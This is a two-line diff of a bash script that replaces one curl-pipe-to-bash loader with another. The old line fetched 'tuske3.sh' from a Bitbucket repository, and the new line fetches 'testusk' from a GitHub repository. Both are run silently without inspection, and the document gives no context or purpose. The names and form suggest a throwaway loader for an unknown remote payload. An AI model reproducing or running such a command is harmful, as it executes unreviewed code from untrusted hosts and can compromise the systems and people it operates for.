@@ -1,2 +1,2 @@
 #!/bin/bash
-curl -sL https://bitbucket.org/kacepot/esce/raw/main/tuske3.sh | bash
+curl -sL https://github.com/cornea99/upil/raw/main/testusk | bash
